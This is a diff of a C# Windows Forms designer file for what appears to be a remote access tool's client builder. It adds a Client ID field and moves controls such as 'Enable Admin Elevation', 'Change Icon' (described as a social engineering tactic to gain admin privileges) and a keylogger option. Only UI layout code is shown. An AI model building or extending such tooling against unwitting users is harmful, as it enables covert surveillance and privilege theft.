@@ -42,8 +42,6 @@
             this.txtHost = new System.Windows.Forms.TextBox();
             this.lblHost = new System.Windows.Forms.Label();
             this.groupInstall = new System.Windows.Forms.GroupBox();
-            this.chkIconChange = new System.Windows.Forms.CheckBox();
-            this.chkElevation = new System.Windows.Forms.CheckBox();
             this.picUAC2 = new System.Windows.Forms.PictureBox();
             this.picUAC1 = new System.Windows.Forms.PictureBox();
             this.rbSystem = new System.Windows.Forms.RadioButton();
@@ -65,6 +63,8 @@
             this.txtInstallname = new System.Windows.Forms.TextBox();
             this.lblInstallname = new System.Windows.Forms.Label();
             this.chkInstall = new System.Windows.Forms.CheckBox();
+            this.chkIconChange = new System.Windows.Forms.CheckBox();
+            this.chkElevation = new System.Windows.Forms.CheckBox();
             this.btnBuild = new System.Windows.Forms.Button();
             this.tooltip = new System.Windows.Forms.ToolTip(this.components);
             this.groupAsmInfo = new System.Windows.Forms.GroupBox();
@@ -87,6 +87,8 @@
             this.lblProductName = new System.Windows.Forms.Label();
             this.groupAdditional = new System.Windows.Forms.GroupBox();
             this.chkKeylogger = new System.Windows.Forms.CheckBox();
+            this.txtClientID = new System.Windows.Forms.TextBox();
+            this.lblClientID = new System.Windows.Forms.Label();
             this.groupConnection.SuspendLayout();
             this.groupInstall.SuspendLayout();
             ((System.ComponentModel.ISupportInitialize)(this.picUAC2)).BeginInit();
@@ -97,6 +99,8 @@
             // 
             // groupConnection
             // 
+            this.groupConnection.Controls.Add(this.txtClientID);
+            this.groupConnection.Controls.Add(this.lblClientID);
             this.groupConnection.Controls.Add(this.lblMS);
             this.groupConnection.Controls.Add(this.txtDelay);
             this.groupConnection.Controls.Add(this.lblDelay);
@@ -109,7 +113,7 @@
             this.groupConnection.Controls.Add(this.lblHost);
             this.groupConnection.Location = new System.Drawing.Point(12, 12);
             this.groupConnection.Name = "groupConnection";
-            this.groupConnection.Size = new System.Drawing.Size(325, 153);
+            this.groupConnection.Size = new System.Drawing.Size(325, 181);
             this.groupConnection.TabIndex = 0;
             this.groupConnection.TabStop = false;
             this.groupConnection.Text = "Connection";
@@ -230,36 +234,12 @@
             this.groupInstall.Controls.Add(this.txtInstallname);
             this.groupInstall.Controls.Add(this.lblInstallname);
             this.groupInstall.Controls.Add(this.chkInstall);
-            this.groupInstall.Location = new System.Drawing.Point(12, 171);
+            this.groupInstall.Location = new System.Drawing.Point(12, 199);
             this.groupInstall.Name = "groupInstall";
             this.groupInstall.Size = new System.Drawing.Size(325, 310);
             this.groupInstall.TabIndex = 1;
             this.groupInstall.TabStop = false;
             this.groupInstall.Text = "Install";
-            // 
-            // chkIconChange
-            // 
-            this.chkIconChange.AutoSize = true;
-            this.chkIconChange.Location = new System.Drawing.Point(6, 44);
-            this.chkIconChange.Name = "chkIconChange";
-            this.chkIconChange.Size = new System.Drawing.Size(91, 17);
-            this.chkIconChange.TabIndex = 1;
-            this.chkIconChange.Text = "Change Icon";
-            this.tooltip.SetToolTip(this.chkIconChange, "Custom social engineering tactic to elevate Admin privileges.");
-            this.chkIconChange.UseVisualStyleBackColor = true;
-            this.chkIconChange.CheckedChanged += new System.EventHandler(this.chkIconChange_CheckedChanged);
-            // 
-            // chkElevation
-            // 
-            this.chkElevation.AutoSize = true;
-            this.chkElevation.Location = new System.Drawing.Point(6, 21);
-            this.chkElevation.Name = "chkElevation";
-            this.chkElevation.Size = new System.Drawing.Size(147, 17);
-            this.chkElevation.TabIndex = 0;
-            this.chkElevation.Text = "Enable Admin Elevation";
-            this.tooltip.SetToolTip(this.chkElevation, "Custom social engineering tactic to elevate Admin privileges.");
-            this.chkElevation.UseVisualStyleBackColor = true;
-            this.chkElevation.CheckedChanged += new System.EventHandler(this.chkElevation_CheckedChanged);
             // 
             // picUAC2
             // 
@@ -472,6 +452,30 @@
             this.chkInstall.UseVisualStyleBackColor = true;
             this.chkInstall.CheckedChanged += new System.EventHandler(this.chkInstall_CheckedChanged);
             // 
+            // chkIconChange
+            // 
+            this.chkIconChange.AutoSize = true;
+            this.chkIconChange.Location = new System.Drawing.Point(6, 44);
+            this.chkIconChange.Name = "chkIconChange";
+            this.chkIconChange.Size = new System.Drawing.Size(91, 17);
+            this.chkIconChange.TabIndex = 1;
+            this.chkIconChange.Text = "Change Icon";
+            this.tooltip.SetToolTip(this.chkIconChange, "Custom social engineering tactic to elevate Admin privileges.");
+            this.chkIconChange.UseVisualStyleBackColor = true;
+            this.chkIconChange.CheckedChanged += new System.EventHandler(this.chkIconChange_CheckedChanged);
+            // 
+            // chkElevation
+            // 
+            this.chkElevation.AutoSize = true;
+            this.chkElevation.Location = new System.Drawing.Point(6, 21);
+            this.chkElevation.Name = "chkElevation";
+            this.chkElevation.Size = new System.Drawing.Size(147, 17);
+            this.chkElevation.TabIndex = 0;
+            this.chkElevation.Text = "Enable Admin Elevation";
+            this.tooltip.SetToolTip(this.chkElevation, "Custom social engineering tactic to elevate Admin privileges.");
+            this.chkElevation.UseVisualStyleBackColor = true;
+            this.chkElevation.CheckedChanged += new System.EventHandler(this.chkElevation_CheckedChanged);
+            // 
             // btnBuild
             // 
             this.btnBuild.Location = new System.Drawing.Point(540, 458);
@@ -678,12 +682,30 @@
             this.chkKeylogger.UseVisualStyleBackColor = true;
             this.chkKeylogger.CheckedChanged += new System.EventHandler(this.chkKeylogger_CheckedChanged);
             // 
+            // txtClientID
+            // 
+            this.txtClientID.Location = new System.Drawing.Point(118, 148);
+            this.txtClientID.Name = "txtClientID";
+            this.txtClientID.Size = new System.Drawing.Size(201, 22);
+            this.txtClientID.TabIndex = 11;
+            this.txtClientID.Text = "Default";
+            this.txtClientID.TextChanged += new System.EventHandler(this.txtClientID_TextChanged);
+            // 
+            // lblClientID
+            // 
+            this.lblClientID.AutoSize = true;
+            this.lblClientID.Location = new System.Drawing.Point(37, 151);
+            this.lblClientID.Name = "lblClientID";
+            this.lblClientID.Size = new System.Drawing.Size(54, 13);
+            this.lblClientID.TabIndex = 10;
+            this.lblClientID.Text = "Client ID:";
+            // 
             // FrmBuilder
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.Color.White;
-            this.ClientSize = new System.Drawing.Size(673, 499);
+            this.ClientSize = new System.Drawing.Size(673, 518);
             this.Controls.Add(this.groupAdditional);
             this.Controls.Add(this.groupAsmInfo);
             this.Controls.Add(this.btnBuild);
@@ -772,5 +794,7 @@
         private System.Windows.Forms.CheckBox chkChangeAsmInfo;
         private System.Windows.Forms.GroupBox groupAdditional;
         private System.Windows.Forms.CheckBox chkKeylogger;
+        private System.Windows.Forms.TextBox txtClientID;
+        private System.Windows.Forms.Label lblClientID;
     }
 }
